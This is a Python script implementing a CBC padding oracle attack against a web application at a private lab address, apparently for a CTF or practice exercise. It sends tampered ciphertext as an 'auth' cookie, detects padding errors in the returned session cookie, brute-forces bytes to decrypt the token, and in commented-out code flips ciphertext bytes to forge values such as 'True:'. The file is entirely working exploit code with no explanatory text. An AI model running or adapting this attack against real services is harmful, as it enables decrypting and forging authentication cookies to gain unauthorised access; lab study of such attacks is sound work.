import requests
import json
import base64


cipher_text = "f9a8866ab45fafcc5c5ecad6865413ea8acabe4b1091f017e8b8a657c39734a1a628593542ce8b6af630de748d4c63a2"
iv = "65d305554faa4de54471e1bfb6a33420"

cipher_text = iv + cipher_text

burp0_url = "http://10.8.0.2:5000/"
burp0_headers = {"Cache-Control": "max-age=0", "Accept-Language": "en-US,en;q=0.9", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": "http://10.8.0.2:5000/login", "Accept-Encoding": "gzip, deflate, br", "Connection": "keep-alive"}

def main():
    
    vic_block = [0]*16
    for i in reversed(range(3)):
        blocks = split_blocks(cipher_text)
        print(i)
        d_block = modify_block(vic_block, blocks, i)
        blocks = split_blocks(cipher_text)
        xor_result = bytes(x ^ y for x, y in zip(blocks[i], d_block))
        print(xor_result)




def split_blocks(ciphertext):
    cipher_text_bytes = bytes.fromhex(cipher_text)

    blocks = [cipher_text_bytes[i:i+16] for i in range(0, len(cipher_text_bytes), 16)]

    return blocks



# whole_blocks = split_blocks(cipher_text)

def check_oracle(block: bytearray, whole_blocks: list[bytes], iv:bytes, index: int):
    whole_blocks[index] = bytes(block)
    whole_blocks = [whole_blocks[index], whole_blocks[index+1]]
    # print(whole_blocks)
    cipher_text_restored = b"".join(whole_blocks).hex()
    cookies = {
        "auth": cipher_text_restored,
        "iv": iv
    }

    response = requests.get(burp0_url, headers=burp0_headers, cookies=cookies, allow_redirects=False)

    payload = response.cookies.get("session").split(".")[0]
    padded = payload + '=' * (-len(payload) % 4)

    session_cookie = base64.urlsafe_b64decode(padded).decode()
   
    # Look for common padding error strings in the response content
    error_indicators = ["padding"]

    if any(err.lower() in session_cookie.lower() for err in error_indicators):
        return False
    print(f"[+] Session cookie: {session_cookie}")
    return True




def modify_block(original_block, blocks, index):
    modified_block = bytearray(original_block)
    D_blocks = []
    for pad in range(15, -1, -1):
        if len(D_blocks) > 0:
            for i, value in enumerate(D_blocks):
                print(hex(len(D_blocks) + 1), end=" ")
                modified_block[pad + i + 1] = value ^ (len(D_blocks) + 1) # 0x01 for 1 pad , 0x02 for 2 pad
        # print(modified_block)
        guess = bruteforce_pad(modified_block, blocks, pad, index) ^ (len(D_blocks) + 1)
        D_blocks.insert(0, guess)
    print(D_blocks)
    return D_blocks
        




def bruteforce_pad(modified_block: bytearray, blocks, pos:int, index:int):
    for guess in range(256):
        modified_block[pos] = guess
        if check_oracle(modified_block, blocks, iv, index):
            # print(guess)
            return guess
        
    return guess
        

# def manipulate():
#     cipher_text = "f9a8866ab45fafcc5c5ecad6865413ea8acabe4b1091f017e8b8a657c39734a1a628593542ce8b6af630de748d4c63a2"
#     cipher_text = bytearray.fromhex(cipher_text)
  

#     # print(cipher_text)

#     first_block = bytes([12, 160, 90, 52, 43, 199, 36, 139, 121, 55, 128, 211, 197, 198, 14, 85])
#     print(first_block)
#     cipher_text[9] = ord('T') ^ first_block[9]
#     cipher_text[10] = ord('r') ^ first_block[10]
#     cipher_text[11] = ord('u') ^ first_block[11]
#     cipher_text[12] = ord('e')^ first_block[12]
#     cipher_text[13] = ord(':') ^ first_block[13]

#     last_block = bytes([183, 251, 176, 69, 30, 159, 254, 25, 230, 182, 168, 89, 205, 153, 58, 175])
#     cipher_text[33] = ord('0') ^ last_block[1]
#     print(bytes(cipher_text).hex())





if __name__  == "__main__":
    main()
